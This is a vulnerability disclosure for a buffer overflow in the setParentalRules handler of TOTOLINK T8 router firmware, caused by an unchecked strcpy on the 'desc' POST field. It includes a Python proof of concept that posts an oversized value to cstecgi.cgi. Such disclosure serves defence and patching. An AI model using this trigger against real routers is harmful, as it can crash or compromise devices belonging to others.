## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/222/ids/36.html

## Affected version

T8_Firmware V4.1.5cu.861_B20230220

## Vulnerability details

In the T8_Firmware V4.1.5cu.861_B20230220 firmware has a buffer overflow vulnerability in the `setParentalRules` function. The `v6` variable receives the `desc` parameter from a POST request. However, since the user can control the input of `desc`, the `strcpy` can cause a buffer overflow vulnerability.

![image-20240902112714559](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240902112714559.png)

![image-20240902112800097](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240902112800097.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
"topicurl":"setParentalRules",
"addEffect":"1",
"mac":"111",
"desc":"b"*0x1000,
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721012919451](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721012919451.png)
